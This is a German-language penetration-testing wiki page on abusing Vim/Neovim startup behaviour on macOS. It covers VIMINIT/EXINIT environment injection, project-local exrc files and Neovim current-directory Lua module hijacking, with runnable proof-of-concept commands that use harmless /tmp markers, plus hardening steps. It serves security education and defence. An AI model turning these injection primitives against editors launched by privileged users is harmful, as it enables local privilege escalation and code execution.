# macOS Vim/Neovim Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Vims eigene Skriptsprache (Vimscript) kann **beim Start beliebige Ex-Befehle und Shell-Befehle aus Umgebungsvariablen ausführen**. Startet ein privilegierterer Prozess (ein Wartungs-/Root-Workflow, ein `sudo vim …`, ein von einem anderen Tool gestarteter Editor, `crontab -e`, `visudo`, `git`/`less`, das einen Editor aufruft, …) Vim/Neovim mit einer vom Angreifer beeinflussten Umgebung, erhält der Angreifer Codeausführung in diesem Kontext.

## `VIMINIT`

Während der Initialisierung liest Vim die Ex-Befehle in **`VIMINIT`** und führt sie aus. Zu den Ex-Befehlen gehören `:!cmd` (einen Shell-Befehl ausführen) und `:call system(...)`; eine einzige Variable ermöglicht also beliebige Ausführung, bevor eine Datei bearbeitet wird.<sup>[[1]](#references)</sup>

```bash
echo "hi" > /tmp/victim.txt

# Shell command via Ex ':!'
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
ls -la /tmp/vim-executed

# Pure Vimscript: write the marker and exit without reading stdin
VIMINIT='call writefile(["x"], "/tmp/vim-vimscript")|qall!' vim /tmp/victim.txt
```

Die im ersten Beispiel über stdin eingespeiste Zeichenfolge `:qa!` schließt den Editor erst, nachdem die Payload ausgeführt wurde; in einem realen Szenario kann das Opfer Vim ganz normal öffnen.

`VIMINIT` wird als **eine Ex-Befehlszeile** geparst. Trenne eine Befehlskette mit `|` (oder einem wörtlichen Zeilenumbruch). Die Variable hat Vorrang vor der vimrc des Benutzers und `EXINIT`, sodass eine Payload keine bösartige Konfigurationsdatei benötigt und vor der normalen Benutzerkonfiguration ausgeführt wird.<sup>[[1]](#references)[[2]](#references)</sup>

## `EXINIT`

Wenn `VIMINIT` nicht gesetzt ist, greift Vim (und die Kompatibilitäts-Binärdateien `vi`/`ex`) auf **`EXINIT`** zurück, das auf dieselbe Weise ausgeführt wird. Dies ist die klassische Variante aus der vi-Ära desselben Primitivs.<sup>[[1]](#references)</sup>

```bash
printf ':qa!\n' | EXINIT='silent! !touch /tmp/exinit-executed' vim /tmp/victim.txt
ls -la /tmp/exinit-executed
```

## Projektlokale rc mit Vim `exrc`

Dies ist eine dateibasierte Alternative zu `VIMINIT`. Wenn das Opfer in seiner Benutzerkonfiguration `set exrc` aktiviert hat, lädt Vim auch `.vimrc` (danach `_vimrc` oder `.exrc`) aus seinem **Arbeitsverzeichnis** und nicht nur aus dem Verzeichnis der bearbeiteten Datei. Platziere eine projektlokale `.vimrc` und lass das Opfer Vim aus diesem Projekt heraus starten. Unter Unix schränkt Vim eine lokale rc-Datei, die jemand anderem gehört, mit `secure` ein. Ein vom Opfer entpacktes Archiv weist der platzierten Datei normalerweise jedoch den Besitz des Opfers zu und umgeht diese Prüfung.<sup>[[1]](#references)</sup>

Dieser isolierte Marker zeigt den Auslöser beim Start, ohne die echte Benutzerkonfiguration zu ändern:<sup>[[1]](#references)</sup>

```bash
lab=$(mktemp -d)
mkdir -p "$lab/home" "$lab/project"
printf 'set exrc\n' > "$lab/home/.vimrc"
printf 'call writefile(["loaded"], "%s/hit")\n' "$lab" > "$lab/project/.vimrc"
(cd "$lab/project" && env -u VIMINIT -u EXINIT HOME="$lab/home" vim -c 'qa!' >/dev/null 2>&1)
test -e "$lab/hit" && echo 'project rc loaded'
rm -r "$lab"
```

Neovim unterscheidet sich: Aktuelle Builds verlangen, dass projektlokale `.nvim.lua`-, `.nvimrc`- oder `.exrc`-Dateien vor der Ausführung als vertrauenswürdig eingestuft werden. Das Vertrauen ist an den Hash des Dateiinhalts gebunden. Wird eine bereits vertrauenswürdige Datei geändert, ist daher eine erneute Vertrauensentscheidung erforderlich. Ein Angreifer, der lediglich eine Datei in einem Repository ablegen kann, darf nicht davon ausgehen, dass sie über `exrc` ohne Rückfrage ausgeführt wird. Unterscheide diesen Opt-in-Pfad, der eine Vertrauensfreigabe erfordert, vom unten beschriebenen `require()`-Pfad für Lua im aktuellen Verzeichnis.<sup>[[4]](#references)[[5]](#references)</sup>

Informationen zu einer beschreibbaren **user**-vimrc-Datei statt zu einer projektlokalen Datei findest du unter [macOS Vim startup configuration](../../macos-auto-start-locations.md#vim-startup-configuration).

## Unterdrückung des Starts und Ausnutzbarkeit

Diese Primitive setzt einen **normalen Start** voraus. `vim -u NONE` / `nvim -u NONE` überspringen die Initialisierung der Umgebung und des Benutzers (sowie Plugins), während `-u <file>` stattdessen diese Datei verwendet. Auch Vim `-es`/`-Es` und Neovim `-es`, `-Es` oder `-l` überspringen diese Initialisierungsschritte. Verwechsle `--headless` nicht mit einem sicheren Modus: Bei einem normalen Headless-Start von Neovim wird `VIMINIT` weiterhin verarbeitet.<sup>[[1]](#references)[[2]](#references)</sup>

Überprüfe daher die gesamte Startkette: Die Variable muss den Wrapper, die `sudo`-Richtlinie, den Job-Runner und die Auswahl des Editors überstehen, und der endgültige Befehl darf weder `-u NONE`/`NORC` noch den Batch-Modus erzwingen. Ein zuverlässiges Payload kann sich mit `|qall!` selbst beenden. Das erleichtert auch das Testen von Wrappern, die kein TTY bereitstellen.<sup>[[1]](#references)[[2]](#references)</sup>

## Hijacking von Lua-Modulen im aktuellen Neovim-Verzeichnis

Eine separate Neovim-Injection-Primitive betrifft Builds, deren Lua-`package.path`/`package.cpath` noch Vorlagen für das aktuelle Verzeichnis wie `./?.lua` oder `./?.so` enthalten. Der alleinige Start von Neovim reicht nicht aus: Eine Konfiguration oder ein Plugin muss `require("name")` aufrufen, und kein früherer Loader darf diesen Namen auflösen. Ein häufiger Auslöser ist die Prüfung einer **optionalen Abhängigkeit**, etwa mit `pcall(require, "optional_dep")`. Wird dann `optional_dep.lua` in einem vom Angreifer kontrollierten Arbeitsverzeichnis abgelegt, wird sie ausgeführt, ohne die separate Funktion für lokale Konfigurationen `'exrc'` zu aktivieren. Core-`vim.*`-Module und Module, die bereits über `'runtimepath'` gefunden werden, lassen sich im Allgemeinen nicht überschreiben. Ermittle daher die tatsächlich fehlenden oder optionalen `require()`-Aufrufe, statt Namen zu erraten.<sup>[[3]](#references)</sup>

Das folgende Beispiel reproduziert die Loader-Primitive mit einem harmlosen Marker:<sup>[[3]](#references)</sup>

```bash
mkdir -p /tmp/nvim-cwd-hijack
cat > /tmp/nvim-cwd-hijack/optional_dep.lua <<'LUA'
vim.fn.writefile({"loaded"}, "/tmp/nvim-cwd-hit")
return {}
LUA

cd /tmp/nvim-cwd-hijack
nvim --clean --headless '+lua require("optional_dep")' +qa
cat /tmp/nvim-cwd-hit
```

Prüfe den laufenden Build, statt dich nur auf eine Versionszeichenfolge zu verlassen:<sup>[[3]](#references)</sup>

```bash
nvim --clean --headless '+lua io.write(package.path)' +qa 2>&1 | tr ';' '\n'
```

Upstream verfolgt die Entfernung des Fallbacks auf das aktuelle Verzeichnis beim normalen Editorstart, während das Verhalten von Lua-Skripten (`nvim -l`) erhalten bleibt. Bis die installierte Build-Version diesen Fallback nicht mehr bereitstellt, füge dies an den **Anfang** von `init.lua` ein (dadurch werden absichtlich relative Lua-/C-Modulvorlagen aus dem aktuellen Verzeichnis entfernt; wende es daher nicht auf Workflows an, die diese benötigen):<sup>[[3]](#references)</sup>

```lua
local function drop_cwd(path)
  local keep = {}
  for entry in path:gmatch("[^;]+") do
    if not entry:match("^%./") then keep[#keep + 1] = entry end
  end
  return table.concat(keep, ";")
end
package.path = drop_cwd(package.path)
package.cpath = drop_cwd(package.cpath)
```

## Hinweise und Einschränkungen

- **Neovim** berücksichtigt sowohl `VIMINIT` als auch den Fallback `EXINIT`, verwendet als normale Benutzerkonfiguration jedoch `init.vim` oder `init.lua`.<sup>[[2]](#references)</sup>
- Für den Pfad über Umgebungsvariablen ist keine beschreibbare Datei erforderlich. Lokale rc-Dateien und das module hijacking im aktuellen Verzeichnis sind separate dateibasierte Primitives.<sup>[[1]](#references)[[3]](#references)</sup>
- Projektlokale rc-Dateien unterscheiden sich von modelines und vom oben beschriebenen `require()`-Fallback für das aktuelle Verzeichnis. Vim und Neovim prüfen sie unterschiedlich; siehe den oben beschriebenen Workflow für projektlokales `exrc`.<sup>[[1]](#references)[[4]](#references)</sup>
- Variablen zur Auswahl des Editors bestimmen nur, welches Programm gestartet wird; sie garantieren nicht, dass `VIMINIT` den endgültigen Prozess erreicht. Prüfen Sie die genaue Umgebung und die Argumente an der Vim-/Neovim-exec-Grenze.<sup>[[1]](#references)[[2]](#references)</sup>

## Härtung

- Entfernen Sie die Variablen explizit, bevor Sie privilegierte oder automatisierte Editorstarts ausführen: `env -u VIMINIT -u EXINIT /usr/bin/vim -u NONE -- "$file"`. `-u NONE` ist wichtig, wenn der Aufrufer alle benutzerseitigen Startquellen ignorieren muss.<sup>[[1]](#references)[[2]](#references)</sup>
- Setzen Sie `EDITOR`/`VISUAL` auf vertrauenswürdige absolute Pfade, vermeiden Sie interaktive Editoren als root mit geerbter Benutzerumgebung und stellen Sie sicher, dass Wrapper `VIMINIT`/`EXINIT` nach der Bereinigung nicht wiederherstellen können.<sup>[[1]](#references)[[2]](#references)</sup>
- Aktualisieren Sie Neovim auf einen Build, der die Lua-/C-Suchvorlagen für das aktuelle Verzeichnis im Editormodus entfernt, oder bereinigen Sie sie, bevor Plugins geladen werden. Prüfen Sie den Plugin-Code auf optionale Aufrufe von `pcall(require, ...)`, wenn nicht vertrauenswürdige Repositories geöffnet werden.<sup>[[3]](#references)</sup>
- Betrachten Sie die Kontrolle über die Editorumgebung, das Arbeitsverzeichnis oder die Startkonfiguration eines Ziels als potenzielles Primitive zur Codeausführung im Sicherheitskontext des Editors.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>



## References

- [1] [Vim-Dokumentation — `starting.txt` (Initialisierung, `VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [2] [Neovim-Dokumentation — Start und Initialisierung](https://neovim.io/doc/user/starting/)
- [3] [Neovim-Issue #38966 — Fallback für das aktuelle Verzeichnis in `require()`](https://github.com/neovim/neovim/issues/38966)
- [4] [Neovim-Optionen — projektlokales `exrc` und Vertrauensanforderung](https://neovim.io/doc/user/options/#%27exrc%27)
- [5] [Neovim-Bearbeitung — vertrauenswürdige Dateien und `:trust`](https://neovim.io/doc/user/editing/#trust)
{{#include ../../../banners/hacktricks-training.md}}
